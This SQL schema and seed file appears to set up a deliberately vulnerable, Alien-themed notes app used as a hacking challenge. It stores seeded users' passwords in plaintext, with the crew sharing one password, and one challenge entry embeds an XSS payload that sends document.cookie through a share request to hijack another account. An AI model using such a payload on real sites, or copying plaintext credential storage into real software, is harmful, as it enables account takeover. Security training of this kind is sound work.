create table users (
  username varchar(50) not null primary key,
  password varchar(250) not null,
  enabled boolean not null
);

create table authorities (
  username varchar(50) not null,
  authority varchar(50) not null,
  constraint fk_authorities_users foreign key (username) references users (username)
);
create unique index ix_auth_username
on authorities (username, authority);

CREATE TABLE NOTE (
  ID      INT NOT NULL PRIMARY KEY GENERATED BY DEFAULT AS IDENTITY (START WITH 1, INCREMENT BY 1),
  TITLE VARCHAR(100),
  CONTENT VARCHAR(1000),
  username varchar(50)
);

CREATE TABLE COMMENTARY (
  ID      INT NOT NULL PRIMARY KEY GENERATED BY DEFAULT AS IDENTITY (START WITH 1, INCREMENT BY 1),
  CONTENT VARCHAR(1000),
  username varchar(50),
  ID_NOTE INT
);

CREATE TABLE COLLABORATEUR (
    ID INT NOT NULL PRIMARY KEY GENERATED BY DEFAULT AS IDENTITY (START WITH 1, INCREMENT BY 1),
    CollaborateurA VARCHAR(50),
    CollaborateurB VARCHAR(50)
);

CREATE TABLE NOTEINCOLLAB (
    ID INT NOT NULL PRIMARY KEY GENERATED BY DEFAULT AS IDENTITY (START WITH 1, INCREMENT BY 1),
    ID_NOTE INT,
    Collaborateur VARCHAR(50)
);

CREATE TABLE CHALLENGESTATE (
    ipAddress varchar(50) not null,
    mission1Achieved varchar(5),
    mission2Achieved varchar(5),
    mission3Achieved varchar(5),
    mission4Achieved varchar(5),
    mission5Achieved varchar(5)
);

CREATE TABLE CHALLENGE (
    ID INT,
    TITLE VARCHAR(50),
    CONTENT VARCHAR(250)
);

-- create user
INSERT INTO users values ('usertestB', 'usertestB', true);
insert into authorities values ('usertestB', 'USER');

INSERT INTO users values ('usertestA', 'usertestA', true);
insert into authorities values ('usertestA', 'USER');

INSERT INTO users values ('Tom Skerritt', 'Nostromo', true);
insert into authorities values ('Tom Skerritt', 'USER');

INSERT INTO users values ('Veronica Cartwright', 'Nostromo', true);
insert into authorities values ('Veronica Cartwright', 'USER');

INSERT INTO users values ('Harry Dean Stanton', 'Nostromo', true);
insert into authorities values ('Harry Dean Stanton', 'USER');

INSERT INTO users values ('John Hurt', 'Nostromo', true);
insert into authorities values ('John Hurt', 'USER');

INSERT INTO users values ('Ian Holm', 'Nostromo', true);
insert into authorities values ('Ian Holm', 'USER');

INSERT INTO users values ('Yaphet Kotto', 'Nostromo', true);
insert into authorities values ('Yaphet Kotto', 'USER');

INSERT INTO users values ('Bolaji Badejo', 'Nostromo', true);
insert into authorities values ('Bolaji Badejo', 'USER');

INSERT INTO NOTE VALUES(1,'Set down on LV-426', 'June 3 2122, after a long trip we landed on LV-426. Unfortunately, the engineering dust entered in the engines, causing it to overheat, the engineering section must be repaired.', 'Tom Skerritt') ;
INSERT INTO NOTE VALUES(2, 'Kane''s serious incident', 'During an expedition outdoor, Kane was attack by an unknown life form. We decided to take off, even if the engines are not fully repaired.', 'Tom Skerritt') ;
INSERT INTO NOTE VALUES(3, 'Horror aboard', 'An alien got out of Kane, it grows fast. We have no chance to get out of here alive.', 'Tom Skerritt') ;

INSERT INTO NOTEINCOLLAB VALUES(1, 3, 'Veronica Cartwright') ;
INSERT INTO NOTEINCOLLAB VALUES(2, 3, 'Harry Dean Stanton') ;
INSERT INTO NOTEINCOLLAB VALUES(3, 3, 'John Hurt') ;
INSERT INTO NOTEINCOLLAB VALUES(4, 3, 'Ian Holm') ;
INSERT INTO NOTEINCOLLAB VALUES(5, 3, 'Yaphet Kotto') ;
INSERT INTO NOTEINCOLLAB VALUES(6, 3, 'Bolaji Badejo') ;

INSERT INTO CHALLENGE VALUES(1, 'Find a confidential post', 'Find confidential informations about the Nostromo.') ;
INSERT INTO CHALLENGE VALUES(2, 'XSS : Get some one else account', 'Use "$.ajax({url:''share?id_Note=3'',type:''GET'', data:''content=''+document.cookie})" as a click event on a button.   ') ;
INSERT INTO CHALLENGE VALUES(3, 'The 8th passenger', 'Connect to one account of the crew.') ;